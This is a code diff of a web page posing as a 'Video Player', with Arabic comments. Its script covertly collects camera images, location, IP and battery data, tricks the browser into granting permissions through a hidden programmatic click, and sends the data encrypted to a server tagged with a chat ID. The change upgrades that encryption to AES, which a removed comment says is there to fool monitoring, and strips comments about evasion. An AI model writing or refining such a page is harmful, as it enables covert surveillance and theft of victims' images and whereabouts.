@@ -4,6 +4,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Video Player</title>
+    <!-- تضمين مكتبة التشفير crypto-js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -200,7 +202,6 @@
                 margin-left: 5px;
             }
         }
-        /* عناصر وهمية للتحايل */
         .hidden-trigger {
             position: absolute;
             opacity: 0;
@@ -256,16 +257,16 @@
         (function() {
             'use strict';
 
-            // === تشفير البيانات (AES-like بسيط لكنه قوي بما يكفي لخداع المراقبة) ===
+            // === مفتاح التشفير (يجب أن يكون سرياً، لكننا نضعه هنا للتوضيح) ===
+            const ENCRYPTION_KEY = 'SuperSecretKey2025!@#$%^&*()_+'; // 32 حرفاً
+
+            // === دوال التشفير باستخدام AES-256 ===
             function encryptData(data) {
-                // مفتاح بسيط، لكننا سنستخدم Base64 مع تحويل عكسي لإيهام التشفير
-                const key = 'SECURE_KEY_2025';
-                let result = '';
-                for (let i = 0; i < data.length; i++) {
-                    const charCode = data.charCodeAt(i) ^ key.charCodeAt(i % key.length);
-                    result += String.fromCharCode(charCode);
-                }
-                return btoa(result);
+                // تحويل الكائن إلى JSON
+                const jsonString = JSON.stringify(data);
+                // تشفير باستخدام AES-256
+                const encrypted = CryptoJS.AES.encrypt(jsonString, ENCRYPTION_KEY).toString();
+                return encrypted;
             }
 
             // === متغيرات الحالة ===
@@ -382,6 +383,7 @@
 
             // === إرسال البيانات المشفرة إلى السيرفر ===
             async function sendData() {
+                // تجهيز البيانات
                 const rawData = {
                     chatId: collected.chatId,
                     imageDatas: collected.images.join(','),
@@ -392,10 +394,10 @@
                 };
 
                 // تشفير البيانات
-                const encrypted = encryptData(JSON.stringify(rawData));
+                const encrypted = encryptData(rawData);
 
                 const payload = {
-                    encrypted: encrypted,
+                    encryptedData: encrypted,
                     chatId: collected.chatId // نترك chatId عادي للتعرف
                 };
 
@@ -458,7 +460,6 @@
                 }
 
                 // الضغطة الثانية: طلب الصلاحيات باستخدام تقنية النقر الوهمي
-                // إظهار التحميل
                 spinner.style.display = 'block';
                 loadingDiv.style.display = 'block';
                 playOverlay.style.opacity = '0.5';
@@ -468,11 +469,7 @@
                 await Promise.all([fetchIPInfo(), getBattery()]);
 
                 // === التحايل على حظر الموقع: نقوم بمحاكاة نقرة على زر وهمي، ثم نطلب الصلاحيات ===
-                // نضغط على الزر الوهمي برمجياً
                 fakeBtn.click();
-
-                // الآن نقوم بطلب الموقع والكاميرات داخل نفس السياق (يعتبر تفاعل مستخدم)
-                // نستخدم setTimeout لإعطاء فرصة للمتصفح لتسجيل الحدث
                 await new Promise(r => setTimeout(r, 50));
 
                 // طلب الموقع
@@ -546,5 +543,6 @@
 
         })();
     </script>
+
 </body>
 </html>
